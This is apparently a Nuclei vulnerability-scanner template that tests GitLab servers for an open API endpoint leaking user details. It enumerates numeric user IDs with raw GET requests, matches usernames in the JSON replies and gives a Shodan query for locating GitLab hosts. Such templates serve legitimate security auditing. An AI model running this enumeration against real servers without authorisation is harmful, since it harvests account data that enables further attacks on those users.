id: gitlab-api-user-enum
info:
  author: Suman_Kar
  metadata:
    shodan-query: http.title:"GitLab"
  name: GitLab - User Information Disclosure Via Open API
  reference:
  - https://gitlab.com/gitlab-org/gitlab-foss/-/issues/40158
  severity: medium
  tags: gitlab,enum,misconfig,disclosure
requests:
- matchers:
  - condition: and
    part: body
    regex:
    - username.*
    - id.*
    - name.*
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    uid: helpers/wordlists/numbers.txt
  raw:
  - 'GET /api/v4/users/{{uid}} HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Referer: {{BaseURL}}

    '
  stop-at-first-match: true
